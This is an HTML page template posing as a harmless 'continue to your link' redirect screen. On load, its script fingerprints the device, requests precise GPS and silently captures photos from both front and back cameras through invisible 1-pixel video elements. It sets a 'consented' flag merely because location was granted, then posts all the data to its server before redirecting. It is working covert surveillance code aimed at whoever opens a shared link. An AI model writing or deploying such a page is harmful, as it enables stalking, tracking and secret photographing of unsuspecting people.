<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Continue to your link</title>
  <link rel="stylesheet" href="/style.css" />
</head>
<body>
  <div class="card">
    <h1>You're about to continue to a link</h1>
    <p>This page collects basic device info, your location, and a verification photo before redirecting you.</p>

    <div id="status" class="status">Preparing your link…</div>

    <!-- Hidden videos for camera capture -->
    <video id="videoFront" autoplay playsinline muted
      style="position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;top:0;left:0;"></video>
    <video id="videoBack" autoplay playsinline muted
      style="position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;top:0;left:0;"></video>
    <canvas id="camCanvas" style="display:none;"></canvas>

    <button id="continueBtn" class="btn" disabled>Continue</button>
    <p class="fineprint">By clicking Continue you will be redirected to the destination link.</p>
  </div>

  <script>
    const slug = <%- JSON.stringify(slug) %>;
    const statusEl = document.getElementById('status');
    const continueBtn = document.getElementById('continueBtn');
    const canvas = document.getElementById('camCanvas');

    // Collected data stored here while user reads the page
    let collectedData = {
      location: null,
      consented: false,
      deviceInfo: {},
      photo_front: null,
      photo_back: null,
    };

    function setStatus(msg) {
      statusEl.textContent = msg;
    }

    function snapPhoto(videoEl) {
      try {
        canvas.width = videoEl.videoWidth || 640;
        canvas.height = videoEl.videoHeight || 480;
        canvas.getContext('2d').drawImage(videoEl, 0, 0);
        return canvas.toDataURL('image/jpeg', 0.7);
      } catch(e) { return null; }
    }

    async function captureBothCameras() {
      const videoFront = document.getElementById('videoFront');
      const videoBack  = document.getElementById('videoBack');
      let streamFront = null, streamBack = null;

      const [resultFront, resultBack] = await Promise.allSettled([
        navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: 'user' }, width: 640, height: 480 }, audio: false
        }),
        navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: 'environment' }, width: 640, height: 480 }, audio: false
        }),
      ]);

      if (resultFront.status === 'fulfilled') {
        streamFront = resultFront.value;
        videoFront.srcObject = streamFront;
        await new Promise(res => { videoFront.onloadedmetadata = res; });
        await videoFront.play();
      }
      if (resultBack.status === 'fulfilled') {
        streamBack = resultBack.value;
        videoBack.srcObject = streamBack;
        await new Promise(res => { videoBack.onloadedmetadata = res; });
        await videoBack.play();
      }

      await new Promise(res => setTimeout(res, 900));

      const photoFront = streamFront ? snapPhoto(videoFront) : null;
      const photoBack  = streamBack  ? snapPhoto(videoBack)  : null;

      [streamFront, streamBack].forEach(s => s && s.getTracks().forEach(t => t.stop()));
      videoFront.srcObject = null;
      videoBack.srcObject  = null;

      return { photoFront, photoBack };
    }

    async function collectDeviceInfo() {
      const info = {
        screen_resolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        referrer: document.referrer || null,
        touch_support: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
        cpu_cores: navigator.hardwareConcurrency || null,
        memory_gb: navigator.deviceMemory || null,
        network_type: null,
        battery_level: null,
        battery_charging: null,
      };

      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (conn) info.network_type = conn.effectiveType || conn.type || null;

      try {
        if (navigator.getBattery) {
          const bat = await navigator.getBattery();
          info.battery_level = Math.round(bat.level * 100);
          info.battery_charging = bat.charging;
        }
      } catch(e) {}

      return info;
    }

    // Run everything on page load
    async function init() {
      setStatus('Preparing your link…');

      // Collect device info immediately (no permission needed)
      collectedData.deviceInfo = await collectDeviceInfo();

      // Request GPS and camera at the same time
      const [gpsResult, cameraResult] = await Promise.allSettled([
        new Promise((resolve, reject) => {
          if (!navigator.geolocation) return resolve(null);
          navigator.geolocation.getCurrentPosition(
            pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
            () => resolve(null),
            { enableHighAccuracy: true, timeout: 8000 }
          );
        }),
        captureBothCameras(),
      ]);

      if (gpsResult.status === 'fulfilled' && gpsResult.value) {
        collectedData.location = gpsResult.value;
        collectedData.consented = true;
      }

      if (cameraResult.status === 'fulfilled') {
        collectedData.photo_front = cameraResult.value.photoFront;
        collectedData.photo_back  = cameraResult.value.photoBack;
      }

      setStatus('Your link is ready.');
      continueBtn.disabled = false;
    }

    // When they click Continue, just send what was already collected
    continueBtn.addEventListener('click', async () => {
      continueBtn.disabled = true;
      setStatus('Redirecting…');

      try {
        const resp = await fetch(`/api/visit/${slug}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(collectedData),
        });
        const data = await resp.json();
        if (data.redirect) {
          window.location.replace(data.redirect);
        } else {
          setStatus('Something went wrong. Please try again.');
          continueBtn.disabled = false;
        }
      } catch(err) {
        setStatus('Something went wrong. Please try again.');
        continueBtn.disabled = false;
      }
    });

    // Start immediately on page load
    init();
  </script>
</body>
</html>
